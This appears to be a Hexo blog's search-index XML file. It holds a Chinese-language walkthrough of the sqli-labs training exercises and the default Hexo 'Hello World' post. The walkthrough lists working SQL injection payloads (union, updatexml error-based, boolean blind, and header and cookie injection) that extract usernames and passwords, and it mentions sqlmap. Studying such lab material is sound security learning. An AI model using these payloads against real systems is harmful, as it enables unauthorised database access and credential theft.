<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title></title>
    <link href="/2023/04/24/sqli-labs/"/>
    <url>/2023/04/24/sqli-labs/</url>
    
    <content type="html"><![CDATA[<h3 id="怎么判断字符型或者数字型"><a href="#怎么判断字符型或者数字型" class="headerlink" title="怎么判断字符型或者数字型?"></a>怎么判断字符型或者数字型?</h3><p>数字型:id&#x3D;2和id&#x3D;3-1返回界面相同<br>原理:说明2-1被解析了,旁边没有引号<br>字符型:id&#x3D;2和id&#x3D;2a页面一样就行<br>原理:MySQL等号两边类型不一致会发生强制转换,字符串-&gt;数字</p><p>group_concat是用,连接多行记录的函数</p><p>less1<br>字符型注入<br>看源码:sql&#x3D;”SELECT * FROM users WHERE id&#x3D;’$id’ LIMIT 0,1”;</p><p>因此:&#x3D;&#x3D;payload:1’   操作   –+&#x3D;&#x3D;</p><p>?id&#x3D;1’ order by 3–+<br>?id&#x3D;1’ order by 4–+<br>?id&#x3D;-1’ union select 1,2,3–+&#x2F;&#x2F;判断回显位<br>?id&#x3D;-1’ union select 1,2,database()–+<br>?id&#x3D;-1’ union select1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()–+</p><p>?id&#x3D;-1’ union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;’users’ and table_schema&#x3D;database()–+</p><p>?id&#x3D;-1’ union select 1,group_concat(username),group_concat(password) from users–+</p><p>less2<br>数字型<br>看源码:sql&#x3D;”SELECT * FROM users WHERE id&#x3D;$id LIMIT 0,1”;<br>直接输入数字就好,解法与less1相同,去掉less1的’和–+即可</p><p>布尔盲注:</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp">?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (<span class="hljs-function"><span class="hljs-keyword">select</span> <span class="hljs-title">mid</span>(<span class="hljs-params">(group_concat(username,<span class="hljs-number">0x7e</span>,password</span>) <span class="hljs-keyword">from</span> users),1,1))</span>=<span class="hljs-string">&#x27;D&#x27;</span><br></code></pre></td></tr></table></figure><p>less3<br>id&#x3D;1’)–+</p><p>less4<br>id&#x3D;1”)–+</p><p>less5<br>报错注入:updatexml函数<br>updatexml(xml_doument,XPath_string,new_value)<br>第一个参数：XML的内容<br>第二个参数：是需要update的位置XPATH路径<br>第三个参数：是更新后的内容<br>所以第一和第三个参数可以随便写，只需要利用第二个参数，他会校验你输入的内容是否符合XPATH格式 ,不对就爆出正确内容<br>可以校验的:0x7e(~),0x5e24(^$),’#’(#)<br>payload:<br>?id&#x3D;1’ and updatexml(1,concat(0x7e,database()),1)–+暴当前数据库</p><p>?id&#x3D;1’ and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema&#x3D;database())),1)–+<br>此时会出现Subquery returns more than 1 row<br>1.可以用limit解决,limit 0,1 1,1 2,1 3,1<br>在limit 3,1找到users表<br>?id&#x3D;1’ and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema&#x3D;database()limit 3,1)),1)–+<br>后面同理爆字段<br>2.加个group_concat解决<br>?id&#x3D;1’ and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database())),1)–+<br>过程同上<br>最后<br>?id&#x3D;1’ and updatexml(1,concat(0x7e,(select group_concat(username) from users)),1)–+</p><p>substr方法<br>‘ or updatexml(1,concat(0x7e,substr((select group_concat(schema_name) from information_schema.schemata),1,31),0x7e),1)–+<br>后面把1,31换成32,31<br>63,31<br>94,31</p><p>less6<br>id&#x3D;1” 与less5一样</p><p>less7<br>布尔盲注<br>根据页面回显试探数据,可以二分法,函数:substring(),mid(),substr().<br>eg.?id&#x3D;1’ and (select mid((select concat(user,0x7e,password) from users),1,1))&#x3D;’’–+<br>一直到less10,布尔和时间盲注直接用sqlimap</p><p>less11<br>输入?id&#x3D;1发现url地址没有显示,抓包发现post方式<br>uname&#x3D;11&amp;passwd&#x3D;1&amp;submit&#x3D;Submit<br>判断字符型<br>接下来用基本的union注入就欧克<br>less12<br>“)型,联合注入<br>less13<br>)’ # 加上报错注入<br>less14<br>“# 加上报错注入<br>less15<br>不显示报错信息只能盲注<br>单引号字符型的布尔盲注:<br>1’ –+<br>用脚本less15.py<br>用法:<br>from less15 import *<br>Database15()<br>Tables15()<br>Columns15(‘库’,’表’)<br>Content15(‘库’,’表’,’字段’,’字段’)<br>less16<br>双引号字符型加括号的盲注<br>1”) –+<br>脚本:less16.py</p><p>less17<br>1.注入点在password栏里,单引号字符加报错注入<br>2.先抓包,copy to file,用sqlmap工具<br>python3 sqlmap.py -r 路径 </p><p>less18<br>注入点在user-agent,且用户名密码必须正确<br>注意:闭合之前的部分必须为空,很恶心<br>‘ or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database())),1) or’</p><p>最后:<br>‘ or updatexml(1,concat(0x7e,(select group_concat(concat(username))from security.users)),1) or’</p><p>less19<br>与18一样,注入点在referer</p><p>less20<br>输入正确的用户名和密码,抓到两个包,get包里有cookie,注入点在cookie</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2023/04/23/hello-world/"/>
    <url>/2023/04/23/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
